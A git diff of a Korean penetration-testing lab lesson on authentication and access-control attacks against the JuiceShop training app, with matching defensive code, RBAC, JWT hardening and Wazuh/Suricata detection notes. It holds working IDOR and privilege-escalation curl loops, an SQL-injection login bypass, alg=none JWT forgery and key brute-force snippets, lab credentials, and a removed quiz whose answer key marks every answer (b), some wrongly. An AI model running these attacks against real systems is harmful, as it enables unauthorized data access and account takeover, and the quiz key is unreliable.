+  email=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('data',{}).get('email','?'))" 2>/dev/null)
+  echo "  User $uid : $email"
 done
 ```
 
-### 5.3 수평적 권한 상승 (Horizontal Privilege Escalation)
+**결과 해석:** customer 토큰으로 전체 사용자 이메일이 조회된다 → **BOLA(Broken Object Level Authorization)** — OWASP API Top 10 #1.
 
-같은 권한 수준의 **다른 사용자**의 데이터에 접근하는 것:
+## 4.4 수직적 권한 상승
 
-```bash
-# 다른 사용자의 주문 정보 접근 시도
-for user_id in 1 2 3 4 5; do                           # 반복문 시작
-  RESULT=$(curl -s http://10.20.30.80:3000/api/Users/$user_id \
-    -H "Authorization: Bearer $TOKEN" \
-    -o /tmp/user_$user_id.json -w "%{http_code}")
-  echo "User $user_id: HTTP $RESULT"
-  if [ "$RESULT" = "200" ]; then
-    python3 -c "import json; d=json.load(open('/tmp/user_$user_id.json')); print(f'  Email: {d.get(\"data\",{}).get(\"email\",\"?\")}')" 2>/dev/null  # Python 코드 실행
-  fi
-done
-```
-
-### 5.4 수직적 권한 상승 (Vertical Privilege Escalation)
-
-일반 사용자가 **관리자 기능**에 접근하는 것:
+**상위 권한(admin)** 기능 접근.
 
 ```bash
-# 일반 사용자 토큰으로 관리자 전용 API 접근 시도
-echo "--- 관리자 전용 API 접근 시도 ---"
+echo "== 관리자 기능 접근 시도 (customer 토큰으로) =="
 
-# 관리자 패널
-curl -s -o /dev/null -w "Admin panel: HTTP %{http_code}\n" \
-  http://10.20.30.80:3000/administration \
-  -H "Authorization: Bearer $TOKEN"                    # 인증 토큰
-
-# 전체 사용자 목록
-curl -s -o /dev/null -w "User list: HTTP %{http_code}\n" \
+# 전체 사용자 DB
+curl -s -o /dev/null -w "  /api/Users/           -> HTTP %{http_code}\n" \
   http://10.20.30.80:3000/api/Users/ \
-  -H "Authorization: Bearer $TOKEN"                    # 인증 토큰
+  -H "Authorization: Bearer $TOKEN"
 
-# 피드백 삭제 시도
-curl -s -o /dev/null -w "Delete feedback: HTTP %{http_code}\n" \
+# 피드백 삭제 (DELETE)
+curl -s -o /dev/null -w "  DELETE /api/Feedbacks/1 -> HTTP %{http_code}\n" \
   -X DELETE http://10.20.30.80:3000/api/Feedbacks/1 \
-  -H "Authorization: Bearer $TOKEN"                    # 인증 토큰
+  -H "Authorization: Bearer $TOKEN"
+
+# 관리 설정
+curl -s -o /dev/null -w "  /rest/admin/application-configuration -> HTTP %{http_code}\n" \
+  http://10.20.30.80:3000/rest/admin/application-configuration \
+  -H "Authorization: Bearer $TOKEN"
 ```
 
-### 5.5 관리자 접근 우회
+**결과 해석 — 각 200은 수직 권한상승 성공:**
+- `/api/Users/` 200 → 전체 사용자 목록 유출
+- `DELETE /api/Feedbacks/1` 200 → 일반 사용자가 다른 사람 피드백 삭제
+- `/rest/admin/application-configuration` 200 → 관리 설정 유출
 
-JuiceShop에서는 프론트엔드에서만 관리자 페이지 접근을 제한하는 경우가 있다:
+JuiceShop은 대부분 의도적으로 노출. 실무라면 즉시 CRITICAL.
 
-```bash
-# 관리자 페이지 직접 접근 시도
-# /#/administration 경로를 브라우저에서 직접 입력
-curl -s "http://10.20.30.80:3000/rest/admin/application-configuration" \
-  -H "Authorization: Bearer $TOKEN" \
-  | python3 -m json.tool 2>/dev/null | head -20
-```
-
----
-
-## 6. JuiceShop 챌린지: 접근 제어
-
-### 6.1 Challenge: View another user's basket
+## 4.5 다른 사용자 장바구니에 상품 추가
 
 ```bash
-# Week 04에서 획득한 admin 토큰 사용
-ADMIN_TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"'\'' OR 1=1--","password":"x"}' \
-  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
-
-# admin 토큰으로 다른 사용자의 장바구니 열람
-for i in 1 2 3 4 5; do                                 # 반복문 시작
-  echo "=== Basket $i ==="
-  curl -s http://10.20.30.80:3000/rest/basket/$i \
-    -H "Authorization: Bearer $ADMIN_TOKEN" \
-    | python3 -m json.tool 2>/dev/null | head -10
-done
-```
-
-### 6.2 Challenge: Put an additional product into another user's basket
-
-```bash
-# 다른 사용자의 장바구니에 상품 추가
+# BasketId=1 (admin 장바구니)에 상품 추가 시도
 curl -s -X POST http://10.20.30.80:3000/api/BasketItems/ \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer $TOKEN" \
@@ -525,28 +425,17 @@ curl -s -X POST http://10.20.30.80:3000/api/BasketItems/ \
   | python3 -m json.tool
 ```
 
-> **분석**: BasketId를 1(admin의 장바구니)로 지정하면 내 토큰으로 admin의 장바구니에 물건을 넣을 수 있는지 확인한다.
-
-### 6.3 Challenge: Access admin section
-
-```bash
-# 프론트엔드 JavaScript에서 admin 경로 찾기
-curl -s http://10.20.30.80:3000/main.js 2>/dev/null | grep -oE 'administration|admin' | head -5
-
-# 브라우저에서 직접 접근:
-# http://10.20.30.80:3000/#/administration
-echo "브라우저에서 http://10.20.30.80:3000/#/administration 에 접근하세요"
-```
+**결과 해석:** 성공하면 customer가 admin의 장바구니를 조작한 것. JuiceShop에서 이것이 CTF 챌린지 중 하나.
 
 ---
 
-## 7. 접근 제어 방어
+# Part 5: 접근 제어 방어
 
-### 7.1 서버 측 권한 검증
+## 5.1 서버 측 권한 검증 (가장 중요)
 
 **취약한 코드:**
 ```javascript
-// URL의 ID만으로 데이터 반환 - 위험!
+// URL의 ID만으로 데이터 반환
 app.get('/api/Users/:id', (req, res) => {
   return User.findByPk(req.params.id);
 });
@@ -554,8 +443,8 @@ app.get('/api/Users/:id', (req, res) => {
 
 **안전한 코드:**
 ```javascript
-// 현재 로그인한 사용자의 ID와 비교
 app.get('/api/Users/:id', authenticate, (req, res) => {
+  // 현재 토큰의 user_id와 URL ID 비교
   if (req.user.id !== parseInt(req.params.id) && req.user.role !== 'admin') {
     return res.status(403).json({ error: 'Forbidden' });
   }
@@ -563,187 +452,237 @@ app.get('/api/Users/:id', authenticate, (req, res) => {
 });
 ```
 
-### 7.2 RBAC (Role-Based Access Control)
+**원칙:**
+- 절대 프론트엔드에 권한 검증을 맡기지 말 것
+- 매 API 호출마다 **토큰의 user_id/role**과 **요청 대상**을 비교
+- 비교 실패 시 403 (404가 아닌 이유: 존재 정보 노출 방지용 논쟁 있음)
 
-역할 기반 접근 제어:
+## 5.2 RBAC (Role-Based Access Control)
 
-```
-Admin 역할  → 모든 API 접근 가능
-User 역할   → 자신의 데이터만 접근 가능
-Guest 역할  → 공개 API만 접근 가능
-```
-
-### 7.3 UUID 사용
-
-순차적 ID(1, 2, 3...) 대신 UUID를 사용하면 IDOR이 어려워진다:
+역할별 허용 API 표를 중앙에서 관리:
 
 ```
-# 추측 가능 (위험)
+Admin  → 모든 API
+User   → 자기 데이터 조작, 공개 API 조회
+Guest  → 공개 API만
+```
+
+구현 패턴:
+```javascript
+const policy = {
+  '/api/Users/:id': {
+    GET:  { allow: ['admin', 'self'] },
+    PUT:  { allow: ['admin', 'self'] },
+    DELETE: { allow: ['admin'] }
+  }
+};
+```
+
+## 5.3 UUID 사용
+
+순차 ID(1, 2, 3...) 대신 UUID:
+
+```
+# 추측 가능 (IDOR 쉬움)
 GET /api/Users/1
-GET /api/Users/2
 
-# 추측 불가능 (안전)
+# 추측 불가 (보조 방어)
 GET /api/Users/550e8400-e29b-41d4-a716-446655440000
 ```
 
-> **주의**: UUID만으로는 완전한 방어가 되지 않는다. 서버 측 권한 검증이 반드시 필요하다.
+**주의:** UUID는 **보조** 방어. 메인은 서버 측 권한 검증. UUID만 믿으면 log, referer 등으로 유출될 때 여전히 취약.
 
----
+## 5.4 비밀번호 정책 + brute force 방어
 
-## 8. Bastion로 접근 제어 테스트 자동화
+```
+- 최소 10자 (또는 12자 이상 권장)
+- 사전 단어 차단 (zxcvbn 라이브러리)
+- 5회 실패 시 15분 계정 잠금
+- 분당 10회 reCAPTCHA
+- 2FA 강제 (민감 계정)
+```
 
-Bastion Manager API를 호출하여 작업을 수행합니다.
+## 5.5 JWT 방어
 
-```bash
-# 접근 제어 테스트 프로젝트 생성
-PROJECT_ID=$(curl -s -X POST http://localhost:9100/projects \
-  -H "Content-Type: application/json" \
-  -H "X-API-Key: ccc-api-key-2026" \
-  -d '{"name":"week06-access-control","request_text":"JuiceShop 접근 제어 취약점 점검","master_mode":"external"}' \
-  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
-
-curl -s -X POST http://localhost:9100/projects/$PROJECT_ID/plan \
-  -H "X-API-Key: ccc-api-key-2026" > /dev/null     # API 인증 키
-curl -s -X POST http://localhost:9100/projects/$PROJECT_ID/execute \
-  -H "X-API-Key: ccc-api-key-2026" > /dev/null     # API 인증 키
-
-# IDOR 테스트 자동 실행
-curl -s -X POST http://localhost:9100/projects/$PROJECT_ID/execute-plan \
-  -H "Content-Type: application/json" \
-  -H "X-API-Key: ccc-api-key-2026" \
-  -d '{                                                # 요청 데이터(body)
-    "tasks": [
-      {"order":1, "instruction_prompt":"curl -s http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op", "risk_level":"low"},
-      {"order":2, "instruction_prompt":"curl -s http://10.20.30.80:3000/api/Users/ | python3 -m json.tool | head -30", "risk_level":"medium"}
-    ],
-    "subagent_url": "http://localhost:8002"
-  }'
-
-# 결과 확인
-curl -s -H "X-API-Key: ccc-api-key-2026" \
-  http://localhost:9100/projects/$PROJECT_ID/evidence/summary \
-  | python3 -m json.tool
+```
+- RS256 사용 (비대칭) 또는 HS256이면 128비트 이상 랜덤 키
+- 서버 측 알고리즘 화이트리스트 (none 거부)
+- iat, exp, nbf 검증
+- 짧은 만료 (15분) + refresh token 패턴
+- 페이로드에 민감 정보(패스워드 해시 등) 넣지 않기
 ```
 
 ---
 
-## 9. 실습 체크리스트
+# Part 6: SIEM·WAF 탐지
 
-- [ ] 기본/약한 비밀번호로 admin 로그인 시도
-- [ ] 보안 질문 확인 및 비밀번호 재설정 시도
-- [ ] JWT 토큰 디코딩 및 알고리즘 확인
-- [ ] none 알고리즘 JWT 위조 시도
-- [ ] IDOR로 다른 사용자의 장바구니 접근
-- [ ] 일반 사용자 토큰으로 관리자 API 접근 시도
-- [ ] 관리자 페이지(/#/administration) 직접 접근
+## 6.1 Wazuh에서 인증 공격 탐지
 
----
+```bash
+ssh ccc@10.20.30.100 \
+  "sudo grep -iE 'auth|login|brute' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -5"
+```
 
-## 과제
+**탐지 룰 예시:**
+- 짧은 시간 내 다수 로그인 실패 → **brute force**
+- 다른 계정으로 반복 로그인 시도 (credential stuffing)
+- IP당 rate 초과
 
-1. JuiceShop에서 admin의 보안 질문을 확인하고, 비밀번호 재설정을 시도하라 (성공 여부와 과정을 기록)
-2. JWT none 알고리즘 공격으로 admin 토큰을 위조하고, API 접근을 시도한 결과를 보고하라
-3. 일반 사용자 토큰으로 접근 가능한 관리자 API 엔드포인트를 찾아서 목록을 작성하라
-4. IDOR 취약점을 방어하기 위한 방법 3가지를 코드 예시와 함께 설명하라
+## 6.2 Suricata IPS 탐지
 
----
+IDOR 자체는 정상 HTTP 요청이라 Suricata로 탐지하기 어렵다. **인증 공격**만 탐지 가능.
 
-## 핵심 요약
+```bash
+ssh ccc@10.20.30.1 "sudo grep -iE 'brute|auth' /var/log/suricata/fast.log" 2>/dev/null | tail -3
+```
 
-- **인증(Authentication)**은 "누구인가?", **인가(Authorization)**는 "무엇을 할 수 있는가?"
-- **약한 비밀번호**, **예측 가능한 보안 질문**은 인증 우회의 주요 원인
-- **JWT 공격**: none 알고리즘, 비밀 키 브루트포스, 토큰 만료 무시
-- **IDOR**: URL/파라미터의 ID를 변경하여 다른 사용자의 데이터에 접근
-- **수평적 권한 상승**: 같은 레벨의 다른 사용자 데이터 접근
-- **수직적 권한 상승**: 상위 권한(admin) 기능에 접근
-- **방어**: 서버 측 권한 검증, RBAC, UUID 사용, 강력한 비밀번호 정책
+## 6.3 접근 제어 취약점 탐지의 한계
 
-> **다음 주 예고**: Week 07에서는 SSRF(Server-Side Request Forgery)와 파일 업로드 취약점을 다룬다. 서버를 통해 내부 네트워크에 접근하고, 파일 경로 조작으로 시스템 파일을 읽는 실습을 진행한다.
+- **IDOR**: 정상 HTTP 요청과 구분 불가. 방어는 코드 레벨에서만
+- **BOLA**: 마찬가지
+- **수직 권한상승**: 로그에 접근 기록은 남지만, 어떤 요청이 "권한 있는 요청"인지 IPS는 알 수 없음
+
+→ 탐지보다 **예방**(서버 측 권한 검증)이 유일한 방법
 
 ---
 
+# Part 7: Bastion 자연어 접근 제어 점검
+
+```bash
+curl -s -X POST http://10.20.30.200:8003/ask \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "message": "JuiceShop(http://10.20.30.80:3000)에서 customer 권한 토큰으로 /api/Users/1~5를 순차 조회하고, 각 응답 상태 코드를 정리한 뒤 IDOR 취약점 존재 여부를 판단해줘. 토큰은 email=student@test.com, password=Student123!로 로그인해서 발급받으면 돼."
+  }' \
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])"
+```
+
+Evidence 확인:
+
+```bash
+curl -s "http://10.20.30.200:8003/evidence?limit=5" | python3 -c "
+import sys, json
+for e in json.load(sys.stdin)[:5]:
+    msg = e.get('user_message','')[:70]
+    ok = '✓' if e.get('success') else '✗'
+    print(f'  {ok} {msg}')
+"
+```
+
 ---
 
-## 자가 점검 퀴즈 (5문항)
+## 과제 (다음 주까지)
 
-이번 주차의 핵심 기술 내용을 점검한다.
+### 과제 1: 인증 취약점 (30점)
 
-**Q1.** 이 공격 기법이 OWASP Top 10에서 분류되는 카테고리는?
-- (a) Broken Access Control(A01)  (b) **Injection(A03)**  (c) Cryptographic Failures(A02)  (d) SSRF(A10)
+1. admin의 보안 질문을 확인하고 답변 브루트포스 시도 (결과 기록) — 10점
+2. JWT 헤더에서 `alg` 확인, `alg=none` 위조 토큰 생성 후 `/api/Users/` 접근 결과 — 10점
+3. Week 04에서 획득한 admin MD5 해시(`0192023a7bbd73250516f069df18b500`)를 crackstation.net에서 역산한 결과 — 10점
 
-**Q2.** 공격자가 가장 먼저 실행하는 정찰 활동은?
-- (a) 랜섬웨어 배포  (b) **포트 스캔 및 서비스 핑거프린팅**  (c) DDoS 공격  (d) 방화벽 비활성화
+### 과제 2: 접근 제어 취약점 (40점)
 
-**Q3.** SQLi에서 '--'의 역할은?
-- (a) 문자열 연결  (b) **SQL 주석 (이후 쿼리 무시)**  (c) 변수 선언  (d) 함수 호출
+1. customer 토큰으로 `/rest/basket/1~5` 조회 결과표 작성 — 10점
+2. customer 토큰으로 수직 권한 상승(전체 사용자, 피드백 삭제) 시도 결과 — 10점
+3. customer 토큰으로 admin의 장바구니에 상품 추가 시도 결과 — 10점
+4. 발견한 모든 접근 제어 취약점의 CVSS v3.1 스코어 산정 — 10점
 
-**Q4.** MITRE ATT&CK에서 이 기법의 전술(Tactic)은?
-- (a) Impact만  (b) **해당 전술 ID 확인 필요**  (c) 모든 전술  (d) 해당 없음
+### 과제 3: 방어 코드 (30점)
 
-**Q5.** 방어자가 이 공격을 탐지하기 위해 확인해야 하는 로그는?
-- (a) CPU 사용률만  (b) **SIEM 경보 + 해당 서비스 로그**  (c) 디스크 용량만  (d) 네트워크 대역폭만
-
-**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b
+1. IDOR 방어 `/api/Users/:id` 엔드포인트의 Node.js(Express) 코드 — 10점
+2. RBAC 정책 객체 설계 (3개 역할 × 최소 5개 API) — 10점
+3. Bastion `/ask`로 IDOR 자동 점검 결과 + `/evidence` 기록 — 10점
 
 ---
+
+## 다음 주 예고
+
+**Week 07: SSRF + 파일 업로드 + 경로 순회**
+- SSRF로 내부 메타데이터 API 접근
+- JuiceShop 파일 업로드 우회 (`%2500` null byte)
+- 경로 순회 (`../../../etc/passwd`)
+- XXE (XML External Entity)
+
+---
+
+## 용어 해설 (이번 주 추가분)
+
+| 용어 | 영문 | 설명 |
+|------|------|------|
+| **인증** | Authentication | "너 누구?" — 신원 확인 |
+| **인가** | Authorization | "너 뭐 할 수 있어?" — 권한 확인 |
+| **IDOR** | Insecure Direct Object Reference | ID를 바꿔 다른 사용자 데이터 접근 |
+| **BOLA** | Broken Object Level Authorization | IDOR의 API 버전 (OWASP API #1) |
+| **수평 권한상승** | Horizontal Privilege Escalation | 같은 레벨의 다른 사용자 데이터 접근 |
+| **수직 권한상승** | Vertical Privilege Escalation | 상위 권한(admin) 기능 접근 |
+| **alg=none** | - | JWT 서명 검증 스킵하는 알고리즘 |
+| **RS256** | RSA SHA-256 | 비대칭 JWT 서명 (JuiceShop 사용) |
+| **HS256** | HMAC SHA-256 | 대칭 JWT 서명 |
+| **RBAC** | Role-Based Access Control | 역할 기반 접근 제어 |
+| **UUID** | Universally Unique Identifier | 128비트 랜덤 식별자 |
+| **Credential Stuffing** | - | 유출된 다른 서비스 ID/PW를 여기에 시도 |
+| **rate limiting** | - | 시간당 요청 수 제한 |
 
 ---
 
 ## 📂 실습 참조 파일 가이드
 
-> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.
+> 이번 주 실습에서 실제로 사용한 도구·엔드포인트.
 
-### JWT 분석 — jwt-cli / jwt.io
-> **역할:** JWT 디코드·서명 검증·위조 테스트  
-> **실행 위치:** `공격자 측 CLI`  
-> **접속/호출:** `jwt decode <token>`, 웹: `https://jwt.io`
+### Python 내장 JWT 디코더 (이번 주 실제 사용)
 
-**주요 경로·파일**
+이번 주 JWT 분석은 외부 도구 없이 Python 표준 라이브러리(`base64`, `json`, `hmac`)만으로 수행한다. 별도 설치 불필요.
 
-| 경로 | 역할 |
-|------|------|
-| `~/.jwt-cli/` | jwt-cli 설정 |
+**이번 주 사용 패턴:**
 
-**핵심 설정·키**
+```bash
+# 디코딩 (페이로드 기준)
+echo "$TOKEN" | cut -d. -f2 | python3 -c "
+import sys, base64, json
+d = sys.stdin.read().strip()
+d += '=' * (4 - len(d) % 4)
+print(json.dumps(json.loads(base64.urlsafe_b64decode(d)), indent=2))
+"
 
-- `alg=none 공격` — 서명 검증 로직이 알고리즘 필드만 신뢰할 때
-- `HS256 secret 브루트` — 약한 HMAC 키
+# 위조 토큰 생성 (alg=none)
+python3 -c "
+import base64, json
+h = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
+p = base64.urlsafe_b64encode(json.dumps({'role':'admin'}).encode()).decode().rstrip('=')
+print(f'{h}.{p}.')
+"
 
-**UI / CLI 요점**
+# HS256 서명 (키 브루트포스용)
+python3 -c "
+import hmac, hashlib, base64
+msg = 'header.payload'
+sig = hmac.new(b'secret', msg.encode(), hashlib.sha256).digest()
+print(base64.urlsafe_b64encode(sig).decode().rstrip('='))
+"
+```
 
-- `jwt decode <token>` — header/payload 출력
-- `jwt encode --alg HS256 -S secret '{...}'` — 새 토큰 생성
-- `hashcat -m 16500 token.txt wordlist.txt` — HS256 키 크래킹
+### JuiceShop 이번 주 대상 엔드포인트
 
-> **해석 팁.** `alg`를 `none` 또는 `HS256`로 바꿔 공개키를 HMAC 시크릿으로 사용하는 고전 취약점은 여전히 발견된다. 서버가 **알고리즘 화이트리스트**를 갖는지 반드시 확인.
+| 엔드포인트 | 메서드 | 취약점 | 공략 |
+|-----------|--------|--------|------|
+| `/rest/user/login` | POST | 기본 비밀번호 | admin123 |
+| `/rest/user/security-question?email=` | GET | 보안 질문 노출 | admin 보안 질문 조회 |
+| `/rest/user/reset-password` | POST | 답변 brute force | OSINT로 추측 |
+| `/api/Users/` | GET (Bearer) | 수직 권한상승 | customer로 조회 |
+| `/api/Users/:id` | GET (Bearer) | 수평 권한상승 (IDOR) | id 순차 변경 |
+| `/rest/basket/:id` | GET (Bearer) | IDOR | basket_id 순차 접근 |
+| `/api/BasketItems/` | POST (Bearer) | BasketId 조작 | 타인 장바구니에 추가 |
+| `/api/Feedbacks/:id` | DELETE (Bearer) | 수직 권한상승 | customer 토큰으로 삭제 |
+| `/rest/admin/application-configuration` | GET | 관리 설정 유출 | 인증 없이 접근 가능 |
 
-### Burp Suite Community
-> **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
-> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
-> **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)
+### Bastion API — 이번 주 사용 엔드포인트
 
-**주요 경로·파일**
+| 메서드 | 경로 | 용도 |
+|--------|------|------|
+| POST | `/ask` | 자연어 접근제어 점검 지시 |
+| GET | `/evidence?limit=N` | 작업 기록 |
 
-| 경로 | 역할 |
-|------|------|
-| `Proxy → HTTP history` | 모든 캡처된 요청/응답 |
-| `Intruder` | 페이로드 페이즈·위치 기반 자동화 |
-| `Repeater` | 단건 요청 수동 반복 |
+> `/chat`, `/skills`, `/playbooks`, `/onboard`는 이번 주 미사용.
 
-**핵심 설정·키**
+---
 
-- `Proxy listener 127.0.0.1:8080` — 브라우저 프록시 포트
-- `Target → Scope` — in-scope 호스트만 처리
-
-**로그·확인 명령**
-
-- `Logger` — 세션 전체 요청 타임라인
-
-**UI / CLI 요점**
-
-- Ctrl+R — 요청을 Repeater로 전송
-- Ctrl+I — Intruder로 전송 후 위치(§) 설정
-- Intruder Attack type: Sniper/Cluster bomb — 단일/다중 페이로드 조합
-
-> **해석 팁.** Community 버전은 **Intruder 속도 제한**이 있어 대량 브루트포스는 비현실적. 취약점 재현과 보고서 증적 확보에 집중.
-
+> **실습 환경 검증 완료** (2026-03-28): JuiceShop SQLi/XSS/IDOR, nmap, 경로탐색(%2500), sudo NOPASSWD, SSH키, crontab
